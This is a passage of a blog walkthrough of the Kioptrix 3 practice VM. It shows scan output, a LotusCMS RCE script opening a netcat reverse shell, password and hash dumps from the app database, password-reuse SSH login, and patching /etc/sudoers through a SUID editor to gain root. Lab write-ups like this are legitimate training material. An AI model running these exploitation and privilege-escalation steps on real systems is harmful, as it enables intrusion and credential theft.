x-powered-by: PHP/5.2.4-2ubuntu5.6\n| http-sitemap-generator: \n|   Directory structure:\n|     /\n|       Other: 1; php: 1\n|     /gallery/gadmin/\n|       Other: 1\n|     /gallery/photos/\n|       jpg: 3\n|     /gallery/themes/black/\n|       css: 1; js: 1\n|   Longest directory structure:\n|     Depth: 3\n|     Dir: /gallery/themes/black/\n|   Total files found (by extension):\n|_    Other: 2; css: 1; jpg: 3; js: 1; php: 1\n| http-sql-injection: \n|   Possible sqli for queries:\n|     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|     http://kioptrix3.com/index.php?page=loginSubmit%27%20OR%20sqlspider&amp;system=Admin\n|     http://kioptrix3.com/gallery/themes/black/slideshow.php?pause=%27%20OR%20sqlspider\n|     http://kioptrix3.com/gallery/themes/black/%20%22slideshow.php?pause=%22%27%20OR%20sqlspider\n|     http://kioptrix3.com/gallery/themes/black/path+%22gallery.php?id=%22%2bgallery_id%2b%22%27%20OR%20sqlspider&amp;sort=%22%2bfield%2b%22#photos";\n|     http://kioptrix3.com/gallery/themes/black/path+%22gallery.php?id=%22%2bgallery_id%2b%22&amp;sort=%22%2bfield%2b%22%27%20OR%20sqlspider#photos";\n|     http://kioptrix3.com/gallery/themes/black/tags.php?tag=%27%20OR%20sqlspider\n|     http://kioptrix3.com/gallery/themes/black/%20%22slideshow.php?id=%22%27%20OR%20sqlspider\n|     http://kioptrix3.com/gallery/themes/black/%20%22tags.php?sort=%22%2bfield%2b%22%27%20OR%20sqlspider&amp;tag=%22%2btag%2b%22#photos";\n|     http://kioptrix3.com/gallery/themes/black/%20%22tags.php?sort=%22%2bfield%2b%22&amp;tag=%22%2btag%2b%22%27%20OR%20sqlspider#photos";\n|     http://kioptrix3.com/gallery/themes/black/slideshow.php?id=%27%20OR%20sqlspider\n|     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|_    http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider\n|_http-stored-xss: Couldn\'t find any stored XSS vulnerabilities.\n|_http-title: Ligoat Security - Got Goat? Security ...\n| http-vhosts: \n|_127 names had status 200\n|_http-xssed: No previously reported XSS vuln.\nMAC Address: 00:0C:29:0A:F9:22 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 3.70 seconds\n</code></pre>\n<p>So far, we have collected some software versions and some interesting spidered URLs to check out, including some URLs that may be vulnerable to SQL injection.</p>\n<ul>\n<li>Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li>\n<li>PHP/5.2.4-2ubuntu5.6</li>\n</ul>\n<h1 id="webappfingerprinting">Web App Fingerprinting</h1>\n<p>Let\'s manually map the application a bit via our browser and Burp.  We will simply proxy our browser through Burp with Intercept turned off.  This will allow us to quickly click around the web app and then inspect the requests and responses.</p>\n<p>One of the first things we can see is the web application is running something called LotusCMS:<br>\n</p>\n<p>I\'ve never heard of LotusCMS, but let\'s see what <a href="https://www.exploit-db.com/">Exploit DB</a> can tell us about it:<br>\n</p>\n<h1 id="rce">RCE</h1>\n<p>RCE spotted (assuming the vulnerable version of the CMS)!  The ExploitDB page for the Metasploit module references <a href="https://secuniaresearch.flexerasoftware.com/secunia_research/2011-21/">https://secuniaresearch.flexerasoftware.com/secunia_research/2011-21/</a>, which is a decent summary of the issue.  The jist is that arbitrary PHP code execution is possible due to two separate issues in the CMS\' code.  Both issues are caused by incorrectly implemented input sanitization with the input being passed to the PHP eval() statement.  This effectively provides system-level RCE by injecting PHP system() calls.</p>\n<p>Let\'s see if we can find a stand-alone exploit script, instead of using Metasploit.<br>\n</p>\n<p>The <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">repo</a> contains both <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">Bash</a> and <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.rb">Ruby</a> stand-alone exploitation scripts.  Thanks <a href="https://github.com/Hood3dRob1n">Hood3dRob1n</a>!  Let\'s go for the Bash script...  After a quick review, we verify that the script is safe to run and understand its functionality.  When run, the script will check that we have a vulnerable target, ask us to select from a menu of payloads, and then run the exploit.  Interestingly, it appears Hood3dRob1n wrote this script with Kioptrix #3 (1.2) in mind.</p>\n<h2 id="exploitingtherce">Exploiting the RCE</h2>\n<p>We start our listener:</p>\n<pre><code class="language-shell-output">root@kali:~# nc -vvlp 1337\nlistening on [any] 1337 ...\n</code></pre>\n<p>Then run the sploit:</p>\n<pre><code class="language-shell-output">root@kali:~# ./lotusRCE.sh\nUSAGE: ./lotusRCE.sh target LotusCMS_path\nEX: ./lotusRCE.sh 192.168.1.36 /lcms/\nEX: ./lotusRCE.sh ki0ptrix3.com /\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# ./lotusRCE.sh kioptrix3.com /\nPath found, now to check for vuln....\n\n&lt;/html&gt;Hood3dRob1n\nRegex found, site is vulnerable to PHP Code Injection!\n\nAbout to try and inject reverse shell....\nwhat IP to use?\n172.16.2.129\nWhat PORT?\n1337\n\nOK, open your local listener and choose the method for back connect: \n1) NetCat -e      3) NetCat Backpipe  5) Exit\n2) NetCat /dev/tcp  4) NetCat FIFO\n#? 1\n</code></pre>\n<p>Flipping back to our listener:</p>\n<pre><code class="language-shell-output">root@kali:~# nc -vvlp 1337\nlistening on [any] 1337 ...\nconnect to [172.16.2.129] from kioptrix3.com [172.16.2.132] 35306\n\nhostname\nKioptrix3\n\nwhoami\nwww-data\n\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre>\n<p>Very nice, we now have a www-data user shell.  I\'ll admit, I don\'t know much about the Suhosin patch we detected, but I believe it is intended to protect PHP web apps against exploitation.  Maybe it was misconfigured on this app?  At any rate, let\'s go after root.</p>\n<h1 id="localprivilegeescalation">Local Privilege Escalation</h1>\n<h2 id="localenumeration">Local Enumeration</h2>\n<p>I could accomplish this step using my Linux enumeration script, but let\'s have a go by hand.  If we can\'t find any low hanging fruit, we will fall back to the more thorough script.</p>\n<p>We first need to see what we are working with:</p>\n<pre><code class="language-shell-output">uname -a\nLinux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux\n\ncat /etc/*release*\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=8.04\nDISTRIB_CODENAME=hardy\nDISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"\n</code></pre>\n<p>From here, let\'s see what users we have on the system:</p>\n<pre><code class="language-shell-output">cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\ndhcp:x:101:102::/nonexistent:/bin/false\nsyslog:x:102:103::/home/syslog:/bin/false\nklog:x:103:104::/home/klog:/bin/false\nmysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false\nsshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin\nloneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash\ndreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash\n\nlastlog\nUsername         Port     From             Latest\nroot             tty1                      Mon Apr 18 11:29:13 -0400 2011\ndaemon                                     **Never logged in**\nbin                                        **Never logged in**\nsys                                        **Never logged in**\nsync                                       **Never logged in**\ngames                                      **Never logged in**\nman                                        **Never logged in**\nlp                                         **Never logged in**\nmail                                       **Never logged in**\nnews                                       **Never logged in**\nuucp                                       **Never logged in**\nproxy                                      **Never logged in**\nwww-data                                   **Never logged in**\nbackup                                     **Never logged in**\nlist                                       **Never logged in**\nirc                                        **Never logged in**\ngnats                                      **Never logged in**\nlibuuid                                    **Never logged in**\ndhcp                                       **Never logged in**\nsyslog                                     **Never logged in**\nklog                                       **Never logged in**\nmysql                                      **Never logged in**\nsshd                                       **Never logged in**\nloneferret       pts/1    192.168.1.106    Sat Apr 16 08:51:58 -0400 2011\ndreg                                       **Never logged in**\n</code></pre>\n<p>Besides root, it looks like loneferret is the only other user to have accessed the system.  Let\'s see what he has been up to:</p>\n<pre><code class="language-shell-output">ls -la /home/loneferret\ntotal 64\ndrwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 .\ndrwxr-xr-x 5 root       root        4096 Apr 16  2011 ..\n-rw-r--r-- 1 loneferret users         13 Apr 18  2011 .bash_history\n-rw-r--r-- 1 loneferret loneferret   220 Apr 11  2011 .bash_logout\n-rw-r--r-- 1 loneferret loneferret  2940 Apr 11  2011 .bashrc\n-rw------- 1 root       root          15 Apr 15  2011 .nano_history\n-rw-r--r-- 1 loneferret loneferret   586 Apr 11  2011 .profile\ndrwx------ 2 loneferret loneferret  4096 Apr 14  2011 .ssh\n-rw-r--r-- 1 loneferret loneferret     0 Apr 11  2011 .sudo_as_admin_successful\n-rw-r--r-- 1 root       root         224 Apr 16  2011 CompanyPolicy.README\n-rwxrwxr-x 1 root       root       26275 Jan 12  2011 checksec.sh\n\ncat /home/loneferret/.bash_history\nsudo ht\nexit\n\ncat CompanyPolicy.README\nHello new employee,\nIt is company policy here to use our newly installed software for editing, creating and viewing files.\nPlease use the command \'sudo ht\'.\nFailure to do so will result in you immediate termination.\n\nDG\nCEO\n\n/home/loneferret/checksec.sh\nUsage: checksec [OPTION]\n\nOptions:\n\n  --file &lt;executable-file&gt;\n  --dir &lt;directory&gt; [-v]\n  --proc &lt;process name&gt;\n  --proc-all\n  --proc-libs &lt;process ID&gt;\n  --kernel\n  --fortify-file &lt;executable-file&gt;\n  --fortify-proc &lt;process ID&gt;\n  --version\n  --help\n\nFor more information, see:\n  http://www.trapkit.de/tools/checksec.html\n</code></pre>\n<p>Well, that is all very interesting.  We have a couple of references to the <em>ht</em> application as well as a script, that per the [link](<a href="http://www.trapkit.de/tools/checksec.html">http://www.trapkit.de/tools/checksec.html</a> from the help dialogue, "is designed to test what standard Linux OS and PaX security features are being used."  On a hunch, what if we check the security on the the ht executable?</p>\n<pre><code class="language-shell-output">which ht\n/usr/local/bin/ht\n\nls -l /usr/local/bin/ht\n-rwsr-sr-x 1 root root 2072344 Apr 16  2011 /usr/local/bin/ht\n\nht --version\nht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011\n(c) 1999-2004 Stefan Weyergraf\n(c) 1999-2009 Sebastian Biallas &lt;sb@biallas.net&gt;\n</code></pre>\n<p>First, we notice the file is owned by root and has the SUID bit set along with word-executable permissions.  This means that anyone can run this executable file and when they do, it will assume the effective UID of root (0).  Given that this appears to be an editor, I think we have found our way in.</p>\n<pre><code class="language-shell-output">ht /etc/shadow\n\npython -c \'import pty; pty.spawn("/bin/sh")\'\n\n$ ht /etc/shadow\nht /etc/shadow\nError opening terminal: unknown.\n\n$ export TERM=xterm\nexport TERM=xterm\n\n$ ht /etc/shadow\nht /etc/shadow\nsave_systemconfig(): error: I/O error: Permission denied\n\nsudo -l\n[sudo] password for www-data: \n\n</code></pre>\n<p>Damn, we can\'t catch a break.  First, we have trouble running ht in our reverse shell.  Then, once we get past that problem, we run in to permissions issues as the <em>www-data</em> user.  I get the feeling we are supposed to be the <em>loneferret</em> user to take advantage of the ht privilege escalation.  Let\'s keep enumerating and see what we can find.</p>\n<p>(Update: After completing more of this post realized that the permissions issue is actually related to how ht handles the setuid / setgid vs the permissions on /etc/shadow.  If we wanted to, we could have escalate privileges to root using the www-data user.)</p>\n<h2 id="localenumerationpt2">Local Enumeration Pt. 2</h2>\n<p>We have a shell as the <em>www-data</em> user, which means we should have full control of the web application that we compromised.  We didn\'t spend too much time enumerating the web app before we found the PHP exploit, so it\'s possible there is other functionality at play.  We now have the advantage of auditing the web app from the inside.</p>\n<p>On a hunch, let\'s try for a quick and easy win:</p>\n<pre><code class="language-shell-output">$ pwd\npwd\n/home/www/kioptrix3.com\n$ \n\n$ ls -l\nls -l\ntotal 84\ndrwxrwxrwx  2 root root  4096 Apr 15  2011 cache\ndrwxrwxrwx  8 root root  4096 Apr 14  2011 core\ndrwxrwxrwx  8 root root  4096 Apr 14  2011 data\n-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico\ndrwxr-xr-x  7 root root  4096 Apr 14  2011 gallery\n-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt\n-rw-r--r--  1 root root   399 Feb 23  2011 index.php\ndrwxrwxrwx 10 root root  4096 Apr 14  2011 modules\ndrwxrwxrwx  3 root root  4096 Apr 14  2011 style\n-rw-r--r--  1 root root   243 Aug  5  2010 update.php\n\n$ grep password ./*\ngrep password ./*\n\n$ grep password ./*/*\ngrep password ./*/*\n./gallery/db.sql:  `password` varchar(100) NOT NULL default \'\',\n./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_password"] = "fuckeyou";\n[... snip ...]\n\n$ grep gallarific_mysql ./*/*\ngrep gallarific_mysql ./*/*\n./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_server"] = "localhost";\n./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_database"] = "gallery";\n./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_username"] = "root";\n./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_password"] = "fuckeyou";\n[... snip ...]\n</code></pre>\n<p>Hmm, that seems helpful.  Let\'s see what is stored in the DB:</p>\n<pre><code class="language-shell-output">$ mysql -u root -p\nmysql -u root -p\nEnter password: fuckeyou\n\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 212\nServer version: 5.0.51a-3ubuntu5.4 (Ubuntu)\n\nType \'help;\' or \'\\h\' for help. Type \'\\c\' to clear the buffer.\n\nmysql&gt; show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema | \n| gallery            | \n| mysql              | \n+--------------------+\n3 rows in set (0.00 sec)\n\nmysql&gt; use gallery;\nuse gallery;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql&gt; show tables;\nshow tables;\n+----------------------+\n| Tables_in_gallery    |\n+----------------------+\n| dev_accounts         | \n| gallarific_comments  | \n| gallarific_galleries | \n| gallarific_photos    | \n| gallarific_settings  | \n| gallarific_stats     | \n| gallarific_users     | \n+----------------------+\n7 rows in set (0.00 sec)\n\nmysql&gt; select * from dev_accounts;\nselect * from dev_accounts;\n+----+------------+----------------------------------+\n| id | username   | password                         |\n+----+------------+----------------------------------+\n|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | \n|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | \n+----+------------+----------------------------------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select * from gallarific_users;\nselect * from gallarific_users;\n+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+\n| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |\n+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+\n|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | \n+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+\n1 row in set (0.00 sec)\n</code></pre>\n<p>Most interesting here is the password hash for loneferret in the dev_accounts table.  Users are known to reuse passwords, so if we can crack this hash, we may be able to use the password to SSH to the target as the loneferret user.</p>\n<h2 id="passwordhashcracking">Password Hash Cracking</h2>\n<p>Instead of cracking locally, let\'s see if any of the online hash-crackers can help us:<br>\n</p>\n<p>Awesome, <a href="https://crackstation.net/">CrackStation</a> was able to easily crack loneferret\'s password.</p>\n<h2 id="becomingloneferret">Becoming loneferret</h2>\n<p>We now have the lonferret user\'s Gallerific web application password, but that doesn\'t seem to help us much in getting root on the box.  However, maybe the user reused the same password for his local account on the server.  Let\'s find out:</p>\n<pre><code class="language-shell-output">root@kali:~# ssh loneferret@172.16.2.132\nloneferret@172.16.2.132\'s password: [starwars]\nLinux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686\n[... snip ...]\nloneferret@Kioptrix3:~$ whoami\nloneferret\n\nloneferret@Kioptrix3:~$ id\nuid=1000(loneferret) gid=100(users) groups=100(users)\n\nloneferret@Kioptrix3:~$ sudo -l\nUser loneferret may run the following commands on this host:\n    (root) NOPASSWD: !/usr/bin/su\n    (root) NOPASSWD: /usr/local/bin/ht\n</code></pre>\n<p>Very nice, loneferret did in fact reuse his password so we are able to SSH to the server using his accounnt.  This is an example of why password reuse is bad.</p>\n<p>We can also see that loneferret is able to run the ht application as root using the sudo command, but cannot run anything else using sudo.  If you remember what we found out about the ht program earlier, you will recognize that being able to run ht as root via sudo is somewhat moot, as the file is world-executable, is owned by root, and has the setuid bit turned on.  This means running when we execute ht, even without sudo, the program will be running as root.  There are some cases where sudo ht will let us edit files ht can\'t but either way will get us root.</p>\n<h2 id="gettingroot">Getting root</h2>\n<p>Since ht is an editor and we are able to use it to edit any file as root, we have a lot of options here for privilege escalation.  We can now access /etc/shadow by running <code>sudo ht /etc/shadow</code>, but let\'s try something else instead.  We will go after sudo itself.</p>\n<p>From our enumeration, we know there are entries in the /etc/sudoers for the loneferret user.  To get root, we will update /etc/sudoers to allow us to run everything with sudo, including su (i.e. <code>sudo su -</code>).</p>\n<p>Let\'s edit the file:</p>\n<pre><code class="language-shell-output">loneferret@Kioptrix3:~$ ls -l /etc/sudoers\n-r--r----- 1 root root 614 2017-09-10 20:29 /etc/sudoers\n\nloneferret@Kioptrix3:~$ cat /etc/sudoers\ncat: /etc/sudoers: Permission denied\n\nloneferret@Kioptrix3:~$ ht /etc/sudoers\nError opening terminal: xterm-256color.\n\nloneferret@Kioptrix3:~$ export TERM=xterm\nloneferret@Kioptrix3:~$ ht /etc/sudoers\n\nloneferret@Kioptrix3:~$ ht /etc/sudoers\n</code></pre>\n<p>Even though we shouldn\'t have permission to read the sudoers file, using the setuid / setgid ht executable, we are able to load the file.<br>\n</p>\n<p>Now let\'s do some hex patching.  We want to change</p>\n<pre><code class="language-hexdump">\xe2\x94\x8200000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 4e 4f 50 41 |eferret ALL=NOPA|\xe2\x94\x82\n\xe2\x94\x8200000140 53 53 57 44 3a 20 21 2f-75 73 72 2f 62 69 6e 2f |SSWD: !/usr/bin/|\xe2\x94\x82\n\xe2\x94\x8200000150 73 75 2c 20 2f 75 73 72-2f 6c 6f 63 61 6c 2f 62 |su, /usr/local/b|\xe2\x94\x82\n\xe2\x94\x8200000160 69 6e 2f 68 74 0a 0a 23-20 55 6e 63 6f 6d 6d 65 |in/ht??# Uncomme||\n</code></pre>\n<p><code>loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht</code></p>\n<p>to</p>\n<pre><code class="language-hexdump">\xe2\x94\x8200000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 28 41 4c 4c |eferret ALL=(ALL|\xe2\x94\x82\n\xe2\x94\x8200000140 29 20 41 4c 4c 0a 23 2f-75 73 72 2f 62 69 6e 2f |) ALL?#/usr/bin/|\xe2\x94\x82\n\xe2\x94\x8200000150 73 75 2c 20 2f 75 73 72-2f 6c 6f 63 61 6c 2f 62 |su, /usr/local/b|\xe2\x94\x82\n\xe2\x94\x8200000160 69 6e 2f 68 74 0a 0a 23-20 55 6e 63 6f 6d 6d 65 |in/ht??# Uncomme|\xe2\x94\x82\n</code></pre>\n<p><code>loneferret ALL=(ALL) ALL</code><br>\n<code>#/usr/bin/su, /usr/local/bin/ht</code></p>\n<p>This will effectively give us full, root access to the target, as we will be able to run any command as root using sudo.</p>\n<p>Let\'s make the change and save the file using ht:<br>\n</p>\n<p>After saving the file, let\'s see if we win:</p>\n<pre><code class="language-shell-output">loneferret@Kioptrix3:~$ sudo -l\n[sudo] password for loneferret: \nUser loneferret may run the following commands on this host:\n    (ALL) ALL\n\nloneferret@Kioptrix3:~$ sudo su -\n\nroot@Kioptrix3:~# whoami\nroot\n\nroot@Kioptrix3:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Kioptrix3:~# \n</code></pre>\n<p>Woot, woot!  There is is, we have a root shell on our target!</p>\n<h1 id="enumeratinggoodies">Enumerating Goodies</h1>\n<p>Now that we are root, let\'s see what we can find on the box:</p>\n<pre><code class="language-shell-output">root@Kioptrix3:~# cd /root\n\nroot@Kioptrix3:~# ls -l\ntotal 16\n-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt\ndrwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18\n\nroot@Kioptrix3:~# cat Congrats.txt \nGood for you for getting here.\nRegardless of the matter (staying within the spirit of the game of course)\nyou got here, congratulations are in order. Wasn\'t that bad now was it.\n\nWent in a different direction with this VM. Exploit based challenges are\nnice. Helps workout that information gathering part, but sometimes we\nneed to get our hands dirty in other things as well.\nAgain, these VMs are beginner and not intented for everyone. \nDifficulty is relative, keep that in mind.\n\nThe object is to learn, do some research and have a little (legal)\nfun in the process.\n\n\nI hope you enjoyed this third challenge.\n\nSteven McElrea\naka loneferret\nhttp://www.kioptrix.com\n\n\nCredit needs to be given to the creators of the gallery webapp and CMS used\nfor the building of the Kioptrix VM3 site.\n\nMain page CMS: \nhttp://www.lotuscms.org\n\nGallery application: \nGallarific 2.1 - Free Version released October 10, 2009\nhttp://www.gallarific.com\nVulnerable version of this application can be downloaded\nfrom the Exploit-DB website:\nhttp://www.exploit-db.com/exploits/15891/\n\nThe HT Editor can be found here:\nhttp://hte.sourceforge.net/downloads.html\nAnd the vulnerable version on Exploit-DB here:\nhttp://www.exploit-db.com/exploits/17083/\n\n\nAlso, all pictures were taken from Google Images, so being part of the\npublic domain I used them.\n</code></pre>\n<h1 id="conclusion">Conclusion</h1>\n<p>Well, that\'s it for this challenge.  However, looking back on where we ended up, I am almost certain there are other ways to crack this VM.  For example, I imagine there is a SQL injection I missed on the web application that would have led us to the loneferret password hash in the database without first exploiting the LotusCMS RCE vulnerability.  I might go back and try to find this later.  Alternatively if there was another way to find the loneferret username, an SSH brute force using the rockyou password list would have been successful:</p>\n<pre><code class="language-shell-output">root@kali:~# grep ^starwars$ /usr/share/wordlists/rockyou.txt \nstarwars\n</code></pre>\n<p>This just goes to show, both on challenge VMs and real world servers, there is usually more than one way to pop the box.</p>\n<p>Until next time, stay root my friends!</p>\n\n\n            </section>\n\n        </article>\n    </main>\n    <footer class="page-footer">\n        <h3>rootshellz</h3>\n            <p>Drink all the booze hack all the things...</p>\n        <p><a href="../../">Read more posts \xe2\x86\x92</a></p>\n        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"></rect><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"></path><rect y="34" width="84" height="17" rx="4"></rect><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"></path><rect x="67" width="17" height="17" rx="4"></rect></g></g></svg> Published with Ghost</a>\n    </footer>\n    \n</body>\n'